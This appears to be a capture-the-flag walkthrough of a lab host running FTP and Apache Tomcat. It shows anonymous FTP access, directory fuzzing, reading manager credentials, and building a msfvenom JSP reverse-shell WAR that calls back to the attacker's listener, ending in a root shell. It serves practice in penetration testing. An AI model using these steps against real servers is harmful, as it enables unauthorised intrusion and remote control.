# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.072 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.074 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1028ms
rtt min/avg/max/mdev = 0.072/0.073/0.074/0.001 ms
```
## Ports scanning 
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 12:41 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
8080/tcp open  http-proxy
MAC Address: 6A:93:DF:F7:0F:BD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```
``` bash
sudo nmap -p21,8080 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 12:42 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000034s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
8080/tcp open  http    Apache Tomcat 9.0.88
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.88
MAC Address: 6A:93:DF:F7:0F:BD (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```
# FTP enumeration
## Anonymous login
``` bash
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:codebylauti): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50262|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
226 Directory send OK.
ftp> get tomcat.txt
local: tomcat.txt remote: tomcat.txt
229 Entering Extended Passive Mode (|||6868|)
150 Opening BINARY mode data connection for tomcat.txt (74 bytes).
100% |*********************************************************************************************************************************************************************************************************|    74      251.79 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (84.91 KiB/s)
ftp> bye
221 Goodbye.
```
``` bash
cat tomcat.txt
Hello tomcat, can you configure the tomcat server? I lost the password...
```
Most probably **tomcat** is a valid user
# Web enumeration
``` bash
whatweb http://172.17.0.2:8080
http://172.17.0.2:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], Title[Apache Tomcat/9.0.88]
```
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2:8080 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## Basic credentials
``` bash
curl -s http://172.17.0.2:8080/manager/html | grep 'username'
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
```
Credentials **tomcat:s3cret** grant access to the manager app
## RCE
In the manager app it is possible to execute code remotely uploading a .war file.
A .war file 
``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.2 LPORT=443 -f war > reverse.war
Payload size: 1085 bytes
Final size of war file: 1085 bytes
```
``` bash
strings reverse.war | grep jsp
hsblzacw.jsp}TQk
hsblzacw.jspPK
```

In the manager app it is possible to execute code remotely uploading a .war file.
A .war file is a compressed file to run web in java
``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war > reverse.war
Payload size: 1093 bytes
Final size of war file: 1093 bytes
```
``` bash
unzip reverse.war
Archive:  reverse.war
   creating: WEB-INF/
  inflating: WEB-INF/web.xml
  inflating: bkgpzpphcpi.jsp
```
# Reverse shell
``` bash
sudo nc -lvnp 443
listening on [any] 443 ...
```
``` bash
curl http://172.17.0.2:8080/reverse/bkgpzpphcpi.jsp
```
``` bash
sudo nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 47162
whoami
root
```
No privilege escalation but direct root shell
